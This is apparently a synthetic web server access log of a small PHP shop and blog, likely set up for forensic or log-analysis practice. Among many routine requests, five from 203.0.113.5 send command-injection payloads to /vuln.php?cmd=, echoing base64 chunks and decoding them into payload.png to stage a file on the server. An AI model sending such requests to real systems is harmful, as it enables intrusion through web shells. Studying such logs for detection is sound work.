198.51.100.27 - - [02/Sep/2025:19:35:56 +0700] "GET /blog/post3 HTTP/1.1" 200 3604 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:22:15:15 +0700] "GET /assets/main.js HTTP/1.1" 200 1664 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:36:22 +0700] "GET /assets/app.js HTTP/1.1" 200 11108 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:21:08 +0700] "GET /contact.php HTTP/1.1" 200 3377 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:50:45 +0700] "GET /about.php HTTP/1.1" 200 10261 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:22:32:40 +0700] "GET /assets/main.js HTTP/1.1" 200 9414 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:21:28:04 +0700] "GET /products.php?id=12 HTTP/1.1" 200 10623 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:41:28 +0700] "GET /assets/app.js HTTP/1.1" 200 9723 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:43:39 +0700] "GET /sitemap.xml HTTP/1.1" 200 598 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:21:59:12 +0700] "GET /api/data?id=42 HTTP/1.1" 200 9260 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:22:17:56 +0700] "GET /dashboard.php HTTP/1.1" 200 7141 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:48:08 +0700] "GET /blog/post1 HTTP/1.1" 200 7700 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:23:29 +0700] "GET /favicon.ico HTTP/1.1" 200 1871 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:24:45 +0700] "GET /index.php HTTP/1.1" 200 3809 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:29:48 +0700] "GET /sitemap.xml HTTP/1.1" 200 2413 "-" "Chrome/120.0"
203.0.113.5 - - [02/Sep/2025:19:13:27 +0700] "GET /vuln.php?cmd=echo%20R14+Eg/vfzh3TKsDGzbk6vMzO3aUDU8nT56Kz9RxfWY9/td/HXt298Se3T2x44EdccsHP1RS/u6l7y6ZrmdfPfzVaG5ujuUrVmSLptQjBw7Emg+urTk0FcyfPz9u+uDaeOTAgWxRRSZtVL1K+ymVW67cvCNHjsSHbs59MdeuXRu/fvavx7PfeTb6+vrimuXXxI4d4zPG/GQr917LKbz/U6dOxZq1a+Jtb3tb/N3f/V3s37c/lixZEi+88EJJH6f+/qK+PBs2RH9/f3z/+9+PAwcOxLE3jsXtH789oop+VPWmknrL1kHxvGuWXxOHeg8N1mU=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.12 - - [02/Sep/2025:21:47:56 +0700] "GET /assets/app.js HTTP/1.1" 200 4903 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:08:45 +0700] "GET /contact.php HTTP/1.1" 200 5687 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:27:34 +0700] "GET /dashboard.php HTTP/1.1" 200 10320 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:01:40 +0700] "GET /blog/post1 HTTP/1.1" 200 5396 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:47:56 +0700] "GET /images/banner.png HTTP/1.1" 200 5027 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:20:05 +0700] "GET /assets/app.js HTTP/1.1" 200 8095 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:18:33 +0700] "GET /sitemap.xml HTTP/1.1" 200 10998 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:18:44 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 7327 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:22:50:25 +0700] "GET /assets/main.js HTTP/1.1" 200 1792 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:13:14 +0700] "GET /sitemap.xml HTTP/1.1" 200 6304 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:20:03:32 +0700] "GET /assets/style.css HTTP/1.1" 200 6873 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:41:28 +0700] "GET /checkout.php HTTP/1.1" 200 1600 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:27:32 +0700] "GET /sitemap.xml HTTP/1.1" 200 9587 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:56:12 +0700] "GET /robots.txt HTTP/1.1" 200 8794 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:03:48 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7634 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:06:20 +0700] "GET /cart.php HTTP/1.1" 200 10051 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:23:06:30 +0700] "GET /favicon.ico HTTP/1.1" 200 10635 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:03:10 +0700] "GET /assets/app.js HTTP/1.1" 200 2819 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:53:32 +0700] "GET /favicon.ico HTTP/1.1" 200 5942 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:34:15 +0700] "GET /index.php HTTP/1.1" 200 11875 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:21:42:52 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1775 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:27:44 +0700] "GET /index.php HTTP/1.1" 200 5096 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:03:36 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 5734 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:49:52 +0700] "GET /cart.php HTTP/1.1" 200 8498 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:57:28 +0700] "GET /robots.txt HTTP/1.1" 200 11867 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:14:28 +0700] "GET /cart.php HTTP/1.1" 200 5986 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:22:02:15 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1823 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:43:14 +0700] "GET /cart.php HTTP/1.1" 200 6899 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:26:57 +0700] "GET /login.php HTTP/1.1" 200 9026 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:41:10 +0700] "GET /assets/app.js HTTP/1.1" 200 10411 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:28:30 +0700] "GET /cart.php HTTP/1.1" 200 9367 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:09:34 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 9877 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:07:56 +0700] "GET /blog/post1 HTTP/1.1" 200 6553 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:12:16 +0700] "GET /products.php?id=12 HTTP/1.1" 200 6738 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:33:30 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 7673 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:15:51 +0700] "GET /index.php HTTP/1.1" 200 11333 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:22:03:05 +0700] "GET /blog/post3 HTTP/1.1" 200 10982 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:21:13:06 +0700] "GET /assets/app.js HTTP/1.1" 200 8822 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:29:48 +0700] "GET /robots.txt HTTP/1.1" 200 7609 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:41:40 +0700] "GET /assets/app.js HTTP/1.1" 200 11263 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:05:00 +0700] "GET /assets/style.css HTTP/1.1" 200 5043 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:25:50 +0700] "GET /login.php HTTP/1.1" 200 3650 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:34:06 +0700] "GET /assets/app.js HTTP/1.1" 200 4508 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:30:18 +0700] "GET /sitemap.xml HTTP/1.1" 200 1901 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:16:40 +0700] "GET /cart.php HTTP/1.1" 200 1825 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:22:14 +0700] "GET /login.php HTTP/1.1" 200 3775 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:31:57 +0700] "GET /robots.txt HTTP/1.1" 200 10335 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:02:46 +0700] "GET /assets/app.js HTTP/1.1" 200 10612 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:04:56 +0700] "GET /dashboard.php HTTP/1.1" 200 5750 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:22:46:55 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 6123 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:54:44 +0700] "GET /sitemap.xml HTTP/1.1" 200 5848 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:15:52 +0700] "GET /blog/post3 HTTP/1.1" 200 3048 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:06:18 +0700] "GET /assets/app.js HTTP/1.1" 200 10876 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:23:02:35 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 8552 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:08:04 +0700] "GET /images/banner.png HTTP/1.1" 200 9204 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:25:15 +0700] "GET /images/banner.png HTTP/1.1" 200 6198 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:20:16:35 +0700] "GET /assets/style.css HTTP/1.1" 200 621 "-" "Edge/18.18363"
203.0.113.5 - - [02/Sep/2025:19:09:00 +0700] "GET /vuln.php?cmd=echo%204bu0ZMmSePTLjw6uY/2tuTbz1yy/Ji6++OL4yZs/id5DvXHsjWOxu2d3XPmeKyPyB+/C57F06dLBASlGaosPwJD2i9pjyZJ/HvPmjXyS9Pzzz8dHPvqRkv3qwImBePMnbw42MSoMGjQefZx+ePSH8ed//ufxlre8Jbq6uqJ5Xu4uQnFo+tjHPhYXtl2Y/dMpd2nnpXHq1KnYuHFjdP1xV0T+OPXsd57NLlqR5nnNsWOMz/Iprs/burpiXr4+i0NTqj4z1z8nVaWj6l2z/JoxPvdocvs4Xb/6/bFkyZLYemd3tmjcVfP5veOixfGl/ftK+j0=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.13 - - [02/Sep/2025:20:15:36 +0700] "GET /login.php HTTP/1.1" 200 10120 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:13:20 +0700] "GET /dashboard.php HTTP/1.1" 200 2637 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:22:04:56 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 9331 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:44:49 +0700] "GET /favicon.ico HTTP/1.1" 200 9786 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:14:18 +0700] "GET /favicon.ico HTTP/1.1" 200 7689 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:06:22 +0700] "GET /login.php HTTP/1.1" 200 489 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:10:24 +0700] "GET /api/data?id=42 HTTP/1.1" 200 6338 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:21:34:16 +0700] "GET /blog/post2 HTTP/1.1" 200 7246 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:27:26 +0700] "GET /assets/app.js HTTP/1.1" 200 4019 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:04:00 +0700] "GET /index.php HTTP/1.1" 200 7235 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:27:56 +0700] "GET /index.php HTTP/1.1" 200 7207 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:26:40 +0700] "GET /login.php HTTP/1.1" 200 1850 "-" "Bingbot/2.0"
203.0.113.5 - - [02/Sep/2025:19:09:02 +0700] "GET /vuln.php?cmd=echo%207tndE88++52S5cq57LLLS0Y27H+uP25esyZefu3VkuXKm6LhyEcb9KBwEhsjnACXm3f9+6+PgZMD8eijj5akz2oGRqhHldbT9e+/Pl544YV47K8eK+ngVggCETFqcCooBIHi4d+no3LfkaxydVBcX9m6LNTNY3/12GB77iMv526/F7fvHjgxEP/y//qXucBetHOcyIEnAGay9ovaBy9kjeTAgQNx4403jrp/Hc/gFGXCU0TUfWiKiHj/6uvjxRdeiAeKBil4+ptPx6uvVnLiONzZZ58dN625KTu7atnwFBEVh6ao8sR7vFUanKLM4BHVmbw=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
198.51.100.27 - - [02/Sep/2025:22:39:45 +0700] "GET /favicon.ico HTTP/1.1" 200 4829 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:31:16 +0700] "GET /news.php?page=2 HTTP/1.1" 200 6398 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:22:10:28 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 8777 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:31:42 +0700] "GET /blog/post1 HTTP/1.1" 200 4121 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:21:01:32 +0700] "GET /products.php?id=12 HTTP/1.1" 200 2997 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:03:03 +0700] "GET /cart.php HTTP/1.1" 200 9670 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:19:39 +0700] "GET /blog/post3 HTTP/1.1" 200 11558 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:22:14:10 +0700] "GET /sitemap.xml HTTP/1.1" 200 2546 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:21:26:03 +0700] "GET /images/banner.png HTTP/1.1" 200 1809 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:06:55 +0700] "GET /favicon.ico HTTP/1.1" 200 1859 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:29:06 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10294 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:32:11 +0700] "GET /robots.txt HTTP/1.1" 200 3209 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:05:32 +0700] "GET /robots.txt HTTP/1.1" 200 1393 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:47:33 +0700] "GET /contact.php HTTP/1.1" 200 5246 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:33:00 +0700] "GET /cart.php HTTP/1.1" 200 8048 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:24:27 +0700] "GET /products.php?id=12 HTTP/1.1" 200 8638 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:40:50 +0700] "GET /assets/app.js HTTP/1.1" 200 9274 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:09:46 +0700] "GET /about.php HTTP/1.1" 200 10862 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:39:30 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 7136 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:38:48 +0700] "GET /blog/post3 HTTP/1.1" 200 11359 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:00:07 +0700] "GET /favicon.ico HTTP/1.1" 200 4121 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:48:46 +0700] "GET /assets/app.js HTTP/1.1" 200 2849 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:22:34:40 +0700] "GET /api/data?id=42 HTTP/1.1" 200 7508 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:59:40 +0700] "GET /blog/post3 HTTP/1.1" 200 3545 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
203.0.113.5 - - [02/Sep/2025:19:04:32 +0700] "GET /vuln.php?cmd=echo%204HTkyJFYde11cfCv/6qKwRNqV83n946LFsf9Ox6Ia4ruhH3r6afj1VfS3+HF7Yvj967MXdiO/PD8t3d11X9wGknqmU3ZeUeOHImV163M7QCWl96KP378WPzB7181LCBMF5XUU+H9b9y4Mbo253Y0xbq6uuJQ7yHBKaNcHRTmrVm7Jrq7S6+uFJ4rVnygGcn6devj9TdejyefGhqdUHACqM14jKoXExCcInOyHxEVn+RPtWPHjtVVZ/+CsdRnNSfe4604OP3zJUtKHrL8xhuvlwy81bqwNb5WdH5QnckLTndu7Y4XXnghHv3Kl7NFE6Kaz+8=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.12 - - [02/Sep/2025:20:10:12 +0700] "GET /products.php?id=12 HTTP/1.1" 200 3411 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:21:00:10 +0700] "GET /index.php HTTP/1.1" 200 10864 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:20:46:27 +0700] "GET /images/banner.png HTTP/1.1" 200 10866 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:21:54 +0700] "GET /checkout.php HTTP/1.1" 200 7449 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:43:45 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1793 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:24:29 +0700] "GET /blog/post1 HTTP/1.1" 200 6044 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:20:42:45 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10693 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:13:54 +0700] "GET /checkout.php HTTP/1.1" 200 11189 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:04:34 +0700] "GET /blog/post1 HTTP/1.1" 200 11439 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:20:26 +0700] "GET /checkout.php HTTP/1.1" 200 4064 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:38:39 +0700] "GET /assets/app.js HTTP/1.1" 200 11878 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:51:44 +0700] "GET /favicon.ico HTTP/1.1" 200 3054 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:17:05 +0700] "GET /products.php?id=12 HTTP/1.1" 200 2003 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:04:12 +0700] "GET /favicon.ico HTTP/1.1" 200 973 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:19:06 +0700] "GET /cart.php HTTP/1.1" 200 2426 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:14:30 +0700] "GET /images/banner.png HTTP/1.1" 200 5973 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:52:24 +0700] "GET /assets/app.js HTTP/1.1" 200 2504 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:20:24:06 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1875 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:53:36 +0700] "GET /blog/post1 HTTP/1.1" 200 3345 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:42:15 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7053 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:22:54:25 +0700] "GET /news.php?page=2 HTTP/1.1" 200 9484 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:23:02:55 +0700] "GET /blog/post3 HTTP/1.1" 200 10115 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:37:36 +0700] "GET /blog/post2 HTTP/1.1" 200 6060 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:49:14 +0700] "GET /api/data?id=42 HTTP/1.1" 200 322 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:47:00 +0700] "GET /images/banner.png HTTP/1.1" 200 8176 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:37:54 +0700] "GET /images/banner.png HTTP/1.1" 200 10577 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:18:03 +0700] "GET /assets/style.css HTTP/1.1" 200 6312 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:11:21 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7449 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:35:15 +0700] "GET /cart.php HTTP/1.1" 200 4745 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:22:11:45 +0700] "GET /assets/app.js HTTP/1.1" 200 2099 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:35:30 +0700] "GET /blog/post1 HTTP/1.1" 200 5579 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:33:05 +0700] "GET /blog/post3 HTTP/1.1" 200 7375 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:22:21:55 +0700] "GET /api/data?id=42 HTTP/1.1" 200 950 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:43:08 +0700] "GET /cart.php HTTP/1.1" 200 7435 "-" "Chrome/120.0"
203.0.113.5 - - [02/Sep/2025:19:22:45 +0700] "GET /vuln.php?cmd=echo%20w7feGgtbF8Yd43An7M6t3XHs2Bux5/OfzxaVkRlVr2Rqgi1dujReefWVYa9qffvb347IP5egPfOsoz/4/asiIuIHP/hB5q+mj1Q9/Y+/+ZuIiPi9K3+v6K+GFIIwlSt3VfO3fuu3IiLiR5nRcI4fOxYH9j8c3Vu7Y/269XFp56XR19c3uaMTAjAlLmy7MD72sY/FiRMnqjrJn2r1GJpiGtdnsf/4J/8xHtr70ODra089WfI8p2NvHItvjdAHvZ70Pv54XP+BG7Kz68Lq1atj/7598Upm4I1qHTlyJB7ety/et/r92aKKTGpwGm/FDxzLvq4=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.13 - - [02/Sep/2025:21:15:12 +0700] "GET /assets/main.js HTTP/1.1" 200 4832 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:28:24 +0700] "GET /images/banner.png HTTP/1.1" 200 9080 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:47:09 +0700] "GET /assets/style.css HTTP/1.1" 200 6850 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:21:04:51 +0700] "GET /api/data?id=42 HTTP/1.1" 200 7112 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:53:00 +0700] "GET /blog/post1 HTTP/1.1" 200 8373 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:26:36 +0700] "GET /favicon.ico HTTP/1.1" 200 3813 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:32:04 +0700] "GET /assets/app.js HTTP/1.1" 200 7154 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:26:36 +0700] "GET /about.php HTTP/1.1" 200 9349 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:17:08 +0700] "GET /favicon.ico HTTP/1.1" 200 1507 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:13:03 +0700] "GET /checkout.php HTTP/1.1" 200 6922 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:24:14 +0700] "GET /about.php HTTP/1.1" 200 6495 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:05:24 +0700] "GET /images/banner.png HTTP/1.1" 200 9881 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:30:51 +0700] "GET /dashboard.php HTTP/1.1" 200 10270 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:16:36 +0700] "GET /assets/style.css HTTP/1.1" 200 3440 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:21:34:00 +0700] "GET /about.php HTTP/1.1" 200 8264 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:45:29 +0700] "GET /contact.php HTTP/1.1" 200 8770 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:30:00 +0700] "GET /blog/post1 HTTP/1.1" 200 5715 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:01:27 +0700] "GET /news.php?page=2 HTTP/1.1" 200 7581 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:19:45 +0700] "GET /blog/post3 HTTP/1.1" 200 1404 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:34:17 +0700] "GET /about.php HTTP/1.1" 200 3138 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:14:12 +0700] "GET /products.php?id=12 HTTP/1.1" 200 445 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:03:16 +0700] "GET /blog/post1 HTTP/1.1" 200 3133 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:07:18 +0700] "GET /login.php HTTP/1.1" 200 4904 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:23:04 +0700] "GET /images/banner.png HTTP/1.1" 200 2046 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:15:52 +0700] "GET /checkout.php HTTP/1.1" 200 5651 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:39:03 +0700] "GET /cart.php HTTP/1.1" 200 5137 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:06:56 +0700] "GET /assets/app.js HTTP/1.1" 200 2850 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:13:12 +0700] "GET /api/data?id=42 HTTP/1.1" 200 5263 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:21:47:30 +0700] "GET /images/banner.png HTTP/1.1" 200 868 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:45:57 +0700] "GET /blog/post2 HTTP/1.1" 200 8967 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:35:05 +0700] "GET /checkout.php HTTP/1.1" 200 7325 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:06:16 +0700] "GET /index.php HTTP/1.1" 200 9587 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:16:50 +0700] "GET /assets/main.js HTTP/1.1" 200 1853 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:21:09:20 +0700] "GET /favicon.ico HTTP/1.1" 200 9826 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:41:07 +0700] "GET /images/banner.png HTTP/1.1" 200 1817 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:33:03 +0700] "GET /robots.txt HTTP/1.1" 200 4837 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:43:25 +0700] "GET /sitemap.xml HTTP/1.1" 200 959 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:21:13:36 +0700] "GET /checkout.php HTTP/1.1" 200 10173 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:04:52 +0700] "GET /checkout.php HTTP/1.1" 200 5657 "-" "Chrome/120.0"
